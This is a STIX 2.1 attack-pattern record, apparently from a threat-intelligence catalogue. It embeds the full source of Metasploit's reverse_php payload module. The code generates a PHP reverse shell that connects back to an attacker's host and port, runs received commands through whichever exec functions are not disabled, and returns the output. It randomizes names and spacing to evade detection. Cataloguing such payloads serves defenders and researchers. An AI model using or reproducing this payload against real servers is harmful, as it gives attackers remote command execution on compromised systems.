{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--466d040a-8e8b-4a1f-bbb7-745d656f92bf",
    "created": "2024-08-14T16:33:19.290322Z",
    "modified": "2024-08-14T16:33:19.290325Z",
    "name": "PHP Command Shell, Reverse TCP (via PHP)",
    "description": "Reverse PHP connect back shell with checks for disabled functions",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/reverse_php.rb",
            "external_id": "reverse_php.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',\n      'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',\n      'Author'        => 'egypt',\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'cmd',\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n  end\n\n  #\n  # Issues\n  #   - Since each command is executed in a new shell, 'cd' does nothing.\n  #      Perhaps it should be special-cased to call chdir()\n  #   - Tries to get around disable_functions but makes no attempts to\n  #      circumvent safe mode.\n  #\n  def php_reverse_shell\n\n    if (!datastore['LHOST'] or datastore['LHOST'].empty?)\n      # datastore is empty on msfconsole startup\n      ipaddr = '127.0.0.1'\n      port = 4444\n    else\n      ipaddr = datastore['LHOST']\n      port = datastore['LPORT']\n    end\n    exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)\n\n    uri = \"tcp://#{ipaddr}\"\n    socket_family = \"AF_INET\"\n\n    if Rex::Socket.is_ipv6?(ipaddr)\n      uri = \"tcp://[#{ipaddr}]\"\n      socket_family = \"AF_INET6\"\n    end\n\n    shell=<<-END_OF_PHP_CODE\n    #{php_preamble(disabled_varname: \"$dis\")}\n    $ipaddr='#{ipaddr}';\n    $port=#{port};\n\n    if(!function_exists('#{exec_funcname}')){\n      function #{exec_funcname}($c){\n        global $dis;\n        #{php_system_block(cmd_varname: \"$c\", disabled_varname: \"$dis\", output_varname: \"$o\")}\n        return $o;\n      }\n    }\n    $nofuncs='no exec functions';\n    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){\n      $s=@fsockopen(\"#{uri}\",$port);\n      while($c=fread($s,2048)){\n        $out = '';\n        if(substr($c,0,3) == 'cd '){\n          chdir(substr($c,3,-1));\n        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n          break;\n        }else{\n          $out=#{exec_funcname}(substr($c,0,-1));\n          if($out===false){\n            fwrite($s,$nofuncs);\n            break;\n          }\n        }\n        fwrite($s,$out);\n      }\n      fclose($s);\n    }else{\n      $s=@socket_create(#{socket_family},SOCK_STREAM,SOL_TCP);\n      @socket_connect($s,$ipaddr,$port);\n      @socket_write($s,\"socket_create\");\n      while($c=@socket_read($s,2048)){\n        $out = '';\n        if(substr($c,0,3) == 'cd '){\n          chdir(substr($c,3,-1));\n        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n          break;\n        }else{\n          $out=#{exec_funcname}(substr($c,0,-1));\n          if($out===false){\n            @socket_write($s,$nofuncs);\n            break;\n          }\n        }\n        @socket_write($s,$out,strlen($out));\n      }\n      @socket_close($s);\n    }\n    END_OF_PHP_CODE\n\n    # randomize the spaces a bit\n    Rex::Text.randomize_space(shell)\n\n    return shell\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return super + php_reverse_shell\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}